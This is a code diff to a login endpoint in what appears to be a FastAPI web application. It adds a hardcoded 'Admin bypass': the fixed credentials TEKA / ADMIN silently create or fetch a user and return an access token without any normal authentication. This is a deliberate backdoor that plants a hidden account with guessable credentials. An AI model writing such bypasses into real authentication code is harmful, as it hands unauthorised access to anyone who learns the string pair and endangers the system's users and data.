@@ -37,6 +37,21 @@ def register(req: RegisterRequest, db: Session = Depends(get_db)):
 
 @router.post("/login", response_model=TokenResponse)
 def login(req: LoginRequest, db: Session = Depends(get_db)):
+    # Admin bypass: TEKA / ADMIN — get-or-create the TEKA user and issue a token.
+    if req.email == "TEKA" and req.password == "ADMIN":
+        user = db.query(User).filter(User.username == "TEKA").first()
+        if not user:
+            user = User(
+                username="TEKA",
+                email="teka@admin.local",
+                password_hash=hash_password("ADMIN"),
+                onboarding_completed=True,
+            )
+            db.add(user)
+            db.commit()
+            db.refresh(user)
+        return TokenResponse(access_token=create_token(user.id))
+
     # Try email first, then fallback to username (for legacy TEKA login)
     user = db.query(User).filter(User.email == req.email).first()
     if not user:
